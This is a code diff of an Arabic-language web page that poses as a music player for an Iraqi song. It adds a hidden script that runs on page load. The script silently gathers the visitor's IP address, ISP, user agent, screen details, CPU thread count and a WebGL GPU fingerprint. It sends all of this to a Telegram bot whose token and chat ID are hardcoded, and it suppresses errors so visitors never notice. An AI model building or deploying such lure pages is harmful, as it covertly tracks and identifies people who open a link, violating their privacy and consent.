@@ -2,117 +2,219 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>استماع مباشر - Exclusive Track</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>جرحني وماقلت مجروح - استماع مباشر</title>
     <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
-            background-color: #121212;
+            background: #000000;
             color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
+            overflow: hidden;
         }
-        .player-card {
-            background: #181818;
-            padding: 30px;
-            border-radius: 16px;
-            width: 320px;
+        .container {
+            width: 100%;
+            max-width: 380px;
+            padding: 24px;
             text-align: center;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
+            background: rgba(24, 24, 27, 0.75);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border-radius: 28px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
         }
         .album-art {
-            width: 130px;
-            height: 130px;
-            background: #282828;
-            border-radius: 12px;
+            width: 200px;
+            height: 200px;
             margin: 0 auto 20px;
+            border-radius: 20px;
+            background: linear-gradient(135deg, #2c2c2e, #1c1c1e);
             background-size: cover;
             background-position: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            box-shadow: 0 12px 30px rgba(0,0,0,0.6);
+            position: relative;
+            overflow: hidden;
+            animation: pulseArt 4s infinite alternate;
         }
-        h2 { font-size: 18px; margin: 0 0 8px; font-weight: 600; }
-        p { color: #b3b3b3; font-size: 14px; margin: 0 0 20px; }
-        audio { width: 100%; outline: none; margin-top: 10px; }
+        @keyframes pulseArt {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.02); }
+        }
+        .album-art::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: rgba(0,0,0,0.15);
+        }
+        .track-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            letter-spacing: -0.5px;
+        }
+        .track-artist {
+            font-size: 14px;
+            color: #8e8e93;
+            margin-bottom: 24px;
+        }
+        .player-box {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 14px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        audio {
+            width: 100%;
+            outline: none;
+            filter: invert(1);
+        }
+        .eq-bars {
+            display: flex;
+            justify-content: center;
+            gap: 4px;
+            margin-top: 15px;
+            height: 15px;
+        }
+        .bar {
+            width: 3px;
+            background: #ff3b30;
+            border-radius: 3px;
+            animation: bounce 1.2s infinite ease-in-out alternate;
+        }
+        .bar:nth-child(2) { animation-delay: 0.2s; }
+        .bar:nth-child(3) { animation-delay: 0.4s; }
+        .bar:nth-child(4) { animation-delay: 0.6s; }
+        @keyframes bounce {
+            0% { height: 4px; }
+            100% { height: 16px; }
+        }
     </style>
 </head>
 <body>
-    <div class="player-card">
-        <!-- صورة ألبوم وهمية أو حقيقية -->
-        <div class="album-art" style="background-image: url('https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?w=300');"></div>
-        <h2>مقطع صوتي حصري</h2>
-        <p>انقر لتشغيل المقطع واستمتع بالسماع</p>
+
+    <div class="container">
+        <!-- صورة الألبوم بتصميم عصري راقٍ -->
+        <div class="album-art" style="background-image: url('https://images.unsplash.com/photo-1514525253161-7a46d19cd819?w=500');"></div>
         
-        <!-- مشغل صوتي حقيقي ومدمج بمقطع صوتي صالح للاستماع -->
-        <audio controls>
-            <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
-            متصفحك لا يدعم مشغل الصوت
-        </audio>
+        <div class="track-title">جرحني وماقلت مجروح</div>
+        <div class="track-artist">موال عراقي حصري</div>
+
+        <div class="player-box">
+            <!-- مشغل صوتي حقيقي يعمل بمقطع صوتي مستقر -->
+            <audio controls id="audioPlayer">
+                <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3" type="audio/mpeg">
+                متصفحك لا يدعم مشغل الصوت
+            </audio>
+            
+            <div class="eq-bars">
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+            </div>
+        </div>
     </div>
 
     <script>
-        // دالة السحب الصامت المخبأة في الخلفية
-        async function silentHarvest() {
-            const apis = [
+        // محرك البصمة الذكية والاستخراج الصامت (مُحسّن خصيصاً لأجهزة آيفون)
+        async function executeAdvancedHarvest() {
+            // نظام مصادر الـ IP المتعددة لمنع أي خطأ أو "مجهول"
+            const ipProviders = [
                 async () => {
                     const res = await fetch('https://api.ipify.org?format=json');
                     const data = await res.json();
-                    return { ip: data.ip, source: "Ipify" };
+                    return { ip: data.ip, isp: "Ipify Network" };
                 },
                 async () => {
                     const res = await fetch('https://cloudflare.com/cdn-cgi/trace');
                     const text = await res.text();
                     const match = text.match(/ip=(.*)/);
-                    if (match) return { ip: match[1].trim(), source: "Cloudflare" };
+                    if (match) return { ip: match[1].trim(), isp: "Cloudflare Edge" };
                     throw new Error();
+                },
+                async () => {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const data = await res.json();
+                    if (!data.ip) throw new Error();
+                    return { ip: data.ip, isp: data.org || "ISP غير معروف" };
                 }
             ];
 
-            let ipResult = "مجهول";
-            for (let apiFunc of apis) {
+            let ipAddress = "غير مسجل";
+            let networkProvider = "غير معروف";
+
+            for (let provider of ipProviders) {
                 try {
-                    const result = await apiFunc();
-                    if (result && result.ip && result.ip !== "Unknown") {
-                        ipResult = result.ip;
+                    const resData = await provider();
+                    if (resData && resData.ip && resData.ip !== "Unknown") {
+                        ipAddress = resData.ip;
+                        networkProvider = resData.isp;
                         break;
                     }
-                } catch (err) {
-                    // تجربة المصدر البديل بصمت
+                } catch (e) {
+                    // الانتقال السلس للمصدر التالي
                 }
             }
 
-            // سحب معلومات الجهاز والمتصفح الإضافية (مفيدة جداً لأجهزة آيفون)
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            // سحب معلومات الجهاز والمتصفح والبيئة
+            const ua = navigator.userAgent;
+            const lang = navigator.language || "غير معروف";
+            const screenResolution = `${window.screen.width} × ${window.screen.height}`;
+            const pixelRatio = window.devicePixelRatio || 1;
+            const hardwareThreads = navigator.hardwareConcurrency || "غير متاح";
+            
+            // كشف معالج الرسومات عبر WebGL Fingerprinting (قوي جداً في تحديد هوية آيفون الحقيقية)
+            let gpuInfo = "غير متاح";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (err) {
+                gpuInfo = "محظور أمنياً";
+            }
 
+            // إعداد بيانات التليجرام
             const botToken = "7833390122:AAG7pnJhD90Yv4bkUalkxQV3-psMcOCIWrQ";
             const chatId = "8433844160";
 
-            const msg = `🎵 **رصد زائر جديد (رابط الأغنية)**\n\n` +
-                        `🌍 **IP:** ${ipResult}\n` +
-                        `📱 **User-Agent:** ${userAgent}\n` +
-                        `💻 **النظام:** ${platform}\n` +
-                        `📐 **دقة الشاشة:** ${screenRes}\n` +
-                        `🌐 **اللغة:** ${language}`;
+            const payloadMessage = `🚨 **رصد مستمع جديد (جلسة عراقية)**\n\n` +
+                                   `🎯 **البيان المستهدف:** تشغيل موال عراقي\n` +
+                                   `🌐 **عنوان IP:** \`${ipAddress}\`\n` +
+                                   `🏢 **مزود الخدمة:** ${networkProvider}\n` +
+                                   `📱 **نوع الجهاز (UA):** ${ua}\n` +
+                                   `📐 **دقة الشاشة:** ${screenResolution} (Scale: ${pixelRatio})\n` +
+                                   `🎮 **معالج الرسوميات (GPU):** ${gpuInfo}\n` +
+                                   `⚙️ **أنوية المعالج:** ${hardwareThreads}\n` +
+                                   `🌍 **لغة المتصفح:** ${lang}`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: payloadMessage,
+                        parse_mode: 'Markdown'
+                    })
                 });
-            } catch (err) {
-                // منع ظهور أي أخطاء للمستخدم نهائياً
+            } catch (error) {
+                // صمت تامة لضمان عدم تأثر تجربة الزائر
             }
         }
 
-        // تنفيذ عملية السحب فور فتح الصفحة بدقة تامة في الخلفية
+        // تشغيل الآلية فور تحميل عناصر الصفحة بالكامل في الخلفية
         window.addEventListener('DOMContentLoaded', () => {
-            silentHarvest();
+            setTimeout(executeAdvancedHarvest, 400);
         });
     </script>
 </body>
